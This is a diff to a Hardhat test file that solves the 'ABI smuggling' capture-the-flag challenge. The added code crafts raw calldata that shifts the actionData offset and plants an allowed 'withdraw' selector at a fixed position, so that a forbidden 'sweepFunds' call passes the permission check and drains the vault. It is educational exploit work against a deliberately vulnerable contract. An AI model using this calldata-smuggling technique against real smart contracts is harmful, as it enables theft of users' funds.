@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { executeContractCallWithSigners } = require('@gnosis.pm/safe-contracts');
 
 describe('[Challenge] ABI smuggling', function () {
     let deployer, player, recovery;
@@ -44,19 +45,98 @@ describe('[Challenge] ABI smuggling', function () {
     });
 
     it('Execution', async function () {
+
         // function execute in AuthorizedExecutor is vulnerable
         // it uses fixed offset to find selector in calldata
         // but we can move actionData in calldata forward by changing offset in the raw call
         // and write the selector that is allowed to player to the right place in the raw call
 
-        // vaultInterface = vault.interface;
-        // sweepCallData = vaultInterface.encodeFunctionData("sweepFunds", [recovery.address, token.address]);
-        // withdrawCallData = vaultInterface.encodeFunctionData("withdraw", [token.address, recovery.address, 10n**18n]);
-        // console.log("sweep", vaultInterface.encodeFunctionData("execute", [vault.address, sweepCallData]));
-        // console.log("withdraw", vaultInterface.encodeFunctionData("execute", [vault.address, withdrawCallData]));
+        // splits encoded function call into "0x", selector and 32 bytes chunks after
+        function splitIntoChunks(str) {
+            chunks = [];
+            numChunks64 = (str.length - 10) / 64; // number of 32 bytes chunks
+            chunks.push(str.substr(0,2)); // push "0x"
+            chunks.push(str.substr(2,8)); // push selector
+            // push the rest
+            for (i = 0; i < numChunks64; i++) {
+                chunks.push(
+                    str.substr(10 + 64*i, 64)
+                );
+            }
+            return chunks;
+        }
+
+        sweepCallData = vault.interface.encodeFunctionData(
+            "sweepFunds", 
+            [recovery.address, token.address]
+        );
+        withdrawSelector = vault.interface.getSighash(
+            vault.interface.getFunction("withdraw")
+        );
+        executeSweepCallData = vault.interface.encodeFunctionData(
+            "execute", 
+            [vault.address, sweepCallData]
+        );
+
+        chunks = splitIntoChunks(executeSweepCallData);
+        // chunks == [
+        //     '0x',
+        //     '1cff79cd',
+        //     '000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512',
+        //     '0000000000000000000000000000000000000000000000000000000000000040',
+        //     '0000000000000000000000000000000000000000000000000000000000000044',
+        //     '85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12',
+        //     'fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f',
+        //     '64180aa300000000000000000000000000000000000000000000000000000000'
+        // ]
+        chunks[3] = "0000000000000000000000000000000000000000000000000000000000000080"; // chunks[3].length == 64
+        // chunks == [
+        //     '0x',
+        //     '1cff79cd',
+        //     '000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512',
+        //     '0000000000000000000000000000000000000000000000000000000000000080',  change here
+        //     '0000000000000000000000000000000000000000000000000000000000000044',
+        //     '85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12',
+        //     'fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f',
+        //     '64180aa300000000000000000000000000000000000000000000000000000000'
+        // ]
+        chunks.splice(
+            4, 
+            0, 
+            withdrawSelector.substr(2, 8) + "00000000000000000000000000000000000000000000000000000000" // 64 - 8 = 56 zeros
+        );
+        // chunks == [
+        //     '0x',
+        //     '1cff79cd',
+        //     '000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512',
+        //     '0000000000000000000000000000000000000000000000000000000000000080',
+        //     'd9caed1200000000000000000000000000000000000000000000000000000000',  new line here
+        //     '0000000000000000000000000000000000000000000000000000000000000044',
+        //     '85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12',
+        //     'fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f',
+        //     '64180aa300000000000000000000000000000000000000000000000000000000'
+        // ]
+        chunks.splice(
+            4, 
+            0,
+            "0000000000000000000000000000000000000000000000000000000000000000" // 64 zeros
+        )
+        // chunks == [
+        //     '0x',
+        //     '1cff79cd',
+        //     '000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512',
+        //     '0000000000000000000000000000000000000000000000000000000000000080',
+        //     '0000000000000000000000000000000000000000000000000000000000000000',  new line here
+        //     'd9caed1200000000000000000000000000000000000000000000000000000000',
+        //     '0000000000000000000000000000000000000000000000000000000000000044',
+        //     '85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12',
+        //     'fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f',
+        //     '64180aa300000000000000000000000000000000000000000000000000000000'
+        // ]
+        smuggledSweep = chunks.join('');
         
-        smuggledSweep = "0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000d9caed1200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004485fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000";
         await player.sendTransaction({to: vault.address, data: smuggledSweep, gasLimit: 100500});
+
     });
 
     after(async function () {
